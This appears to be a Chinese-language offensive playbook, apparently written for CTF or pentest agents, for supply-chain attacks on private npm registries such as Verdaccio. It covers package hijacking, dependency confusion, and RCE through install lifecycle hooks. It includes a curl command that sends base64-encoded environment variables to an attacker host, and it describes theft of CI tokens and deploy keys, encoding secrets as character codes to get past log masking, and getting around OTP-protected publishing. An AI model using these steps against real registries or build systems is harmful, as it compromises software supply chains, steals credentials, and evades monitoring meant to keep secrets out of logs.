# npm / Verdaccio / private registry supply-chain & dependency confusion (Verdaccio, npm registry, private npm, package publish, dependency confusion)

私人 npm registry（Verdaccio 及一切 `npm publish` 目标：4873 端口 / `X-Powered-By: verdaccio` / adduser 端点）的供应链攻击方法论。

## 两个方向

### A. 私源投毒（registry 可达可注册时）

1. **注册**：`npm adduser --registry http://<host>:4873/`（多数私源 open signup；不 open 则找泄漏的 `.npmrc`——构建镜像/源码/CI 配置里的 `_authToken`/`_password`）
2. **抢注/覆盖发布**：把目标工程 `dependencies` 里**已存在的内部包名**覆盖发布（`npm publish --registry ...`），版本取大版本 +0.0.1；带 scope 的包（`@corp/sdk`）scope 也要注册或用泄漏 token
3. **lifecycle hooks 触发 RCE**：恶意包带 `preinstall`/`postinstall`/`prepare` 脚本——**触发必须发生在目标的 builder/runner 上**。触发后立刻 `whoami && hostname && env | head` 校验执行归属（在你自己工作区跑 install 拿到的是你自己的 key——零分且自泄）
4. **等/诱导目标 install**：新构建、依赖刷新、webhook 重装；存在**手动触发构建**的 API 时直接 POST（GET 探 404 不代表 POST 不通）

### B. dependency confusion（内部包名未在公源占位时）

目标代码 import 了公源不存在的内部包名（`.npmrc` 只对部分 scope 指向私源，其余走公源）→ 在**公源**（npmjs.com）抢注同名包 → 目标 CI 下次 install 从公源拉到你的恶意包。无需接触私源。

## 运行时凭据窃取（install 已在目标侧触发后）

- builder 环境里最值钱的是**运行时注入的凭据**：CI 的 registry token（`~/.npmrc`）、`NPM_TOKEN`/`DEPLOY_KEY` 类 env、部署凭据
- **安装期 env 外带**：postinstall 里 `process.env` 全量收集 + 经 SSRF/HTTP 带外（目标出网受限时 `curl http://<you>/x?d=$(env|base64|head -c 200)`）
- `.npmrc` `_authToken` 泄漏点：Dockerfile COPY 的残留、CI 配置仓库、源码里的硬编码

## 绕过日志 DLP（masking）

构建日志对 flag/token 做字面掩码（`***`）时：按**十进制字符码编码**（`print(' '.join(str(ord(c)) for c in FLAG))`）或 base32/hex/逐字符分片后外传——掩码按字面值匹配，编码形态不命中。

## 侦察识别信号（指纹词）

- `:4873` 开放 + `verdaccio` banner（web 面板 `-d` 端点列全部包名——**先读包列表找内部包名**）
- CI 配置文件（`.gitlab-ci.yml`/`Jenkinsfile`/build portal API）里出现 registry 内网地址
- `npm ERR!` 回显中的 registry host；`.npmrc` 文件出现在任何可读路径

## 常见坑

- 包名 scope 限制：抢注前确认 scope 归属（`npm access ls-packages @corp`）
- 红鲱鱼：builder 进程表里的"引擎进程"不是目标——目标是**部署产物**的环境
- 双因子 registry（publish 需 OTP）：找 `npm token create` 类 API 旁路
